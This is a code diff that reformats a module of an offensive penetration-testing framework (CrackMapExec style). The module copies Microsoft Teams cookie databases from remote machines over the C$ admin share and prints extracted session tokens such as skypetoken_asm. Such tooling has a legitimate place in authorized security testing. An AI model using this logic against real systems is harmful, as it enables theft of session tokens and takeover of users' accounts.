@@ -23,9 +23,7 @@ class CMEModule:
         with open("/tmp/teams_cookies2.txt", "wb") as f:
             for path in paths:
                 try:
-                    connection.conn.getFile(
-                        "C$", path + "/AppData/Roaming/Microsoft/Teams/Cookies", f.write
-                    )
+                    connection.conn.getFile("C$", path + "/AppData/Roaming/Microsoft/Teams/Cookies", f.write)
                     context.log.highlight("Found Cookie file in path " + path)
                     found = 1
                     self.parse_file(context, "skypetoken_asm")
@@ -36,9 +34,7 @@ class CMEModule:
                     if "STATUS_SHARING_VIOLATION" in str(e):
                         context.log.debug(str(e))
                         context.log.highlight("Found Cookie file in path " + path)
-                        context.log.fail(
-                            "Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database"
-                        )
+                        context.log.fail("Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database")
         if found == 0:
             context.log.display("No cookie file found in Users folder")
 
@@ -50,9 +46,7 @@ class CMEModule:
             c.execute("SELECT value FROM cookies WHERE name = '" + name + "'")
             row = c.fetchone()
             if row is None:
-                context.log.fail(
-                    "No " + name + " present in Microsoft Teams Cookies database"
-                )
+                context.log.fail("No " + name + " present in Microsoft Teams Cookies database")
             else:
                 context.log.success("Succesfully extracted " + name + ": ")
                 context.log.success(row[0])
